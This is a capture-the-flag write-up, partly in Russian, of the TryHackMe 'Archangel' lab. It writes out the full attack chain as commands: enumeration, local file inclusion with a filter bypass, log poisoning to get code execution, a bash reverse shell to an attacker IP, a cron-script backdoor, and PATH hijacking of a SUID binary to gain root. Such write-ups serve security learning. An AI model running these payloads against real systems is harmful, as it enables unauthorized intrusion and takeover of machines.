https://tryhackme.com/room/archangel

> [!IP]
> 10.10.139.207

```
nmap -p- 10.10.139.207 -vv -T4
```

```
sudo nmap 10.10.139.207 -sC -sV -p22,80  
```

![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420014507.png)

```
echo "10.10.139.207    mafialive.thm" >> /etc/hosts 
```
### 1 Flag
![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420015150.png)
### FFUF
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://10.10.139.207/FFUZ -ic -c
```

```
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 72ms]
pages                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 86ms]
                        [Status: 200, Size: 19188, Words: 2646, Lines: 321, Duration: 1935ms]
flags                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 104ms]
layout                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 71ms]
                        [Status: 200, Size: 19188, Words: 2646, Lines: 321, Duration: 79ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 86ms]
```

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://mafialive.thm/ -H "Host:FUZZ.mafialive.thm"
```

![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420015842.png)
# LFI to RCE

![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420015917.png)
Контроль это иллюзия)) Интересный параметр ?view=
![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420020620.png)
php://filter/convert.base64-encode/resource=

```
echo "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" |base64 -d
<?php echo 'Control is an illusion'; ?>
```
![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420021626.png)
## Логика работы приложения
### 2 FLAG
```
<?php

            //FLAG: thm{############}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>

```

Посмотрев исходник делаю вывод что ../.. фильтруется для path treversal.Буду использовать словарь и  начинать с конечной точки /var/www/html/development_testing

```
ffuf -w LFI\ payloads.txt:FFUZ -u http://mafialive.thm/test.php?view=/var/www/html/development_testing/FFUZ -ic -c -fs 286,310
```
![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420022659.png)
```
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
root:x:0:0:root:/root:/bin/bash
```
Через error log:
```
https://www.linkedin.com/pulse/php-rce-through-log-poisoning-lucas-mendes-de-oliveira-8u68f
```

```
/var/log/apache2/error.log 
/var/log/apache2/acsess.log 
```

```
http://mafialive.thm/%3C%3fphp%20system('whoami');%20%3f%3E.php
```
![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420024504.png)

Я пойду через access log
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//..////var/log/apache2/access.log
```
![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420050356.png)
![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420050335.png)
Revers shell
```
bash -c 'bash -i &>/dev/tcp/10.11.134.170/1337 <&1' 
```
Данную нагрузку нужно привести в URL code

```
nc -lnvp 1337
```
# 3 Flag
![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420050914.png)
# LPE
### Linpeas

```
wget http://https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80
```

```
wget http://10.11.134.170/linpeas.sh && chmod +x linpeas.sh  && ./linpeas.sh 
```

```
*/1 *   * * *   archangel /opt/helloworld.sh
```
В записях cron интересный скрипт  

```
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
www-data@ubuntu:/tmp$ echo "bash -c 'bash -i &>/dev/tcp/10.11.134.170/1338 <&1' " >> /opt/helloworld.sh
```

```
nc -lnvp 1338
```

## 4 Flag
```
 ls -la /home/archangel/secret.
```
![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420052240.png)


```
strings /home/archangel/secret/backup
cp /home/user/archangel/myfiles/* /opt/backupfiles

```
Нашел SUID-бинарник backup, который вызывал cp без указания полного пути.
```
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
```
Проверяем PATH))
```
echo $PATH
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```
Добавляем свой путь 
```
export PATH=/tmp:$PATH
```
Итого)
```
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

```
echo '#!/bin/bash' > /tmp/cp
echo "chmod u+s /bin/bash" >> /tmp/cp
chmod +x /tmp/cp
./backup
```
## 5 Flag

![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/20250420055029/screenshots/20250420052240.png)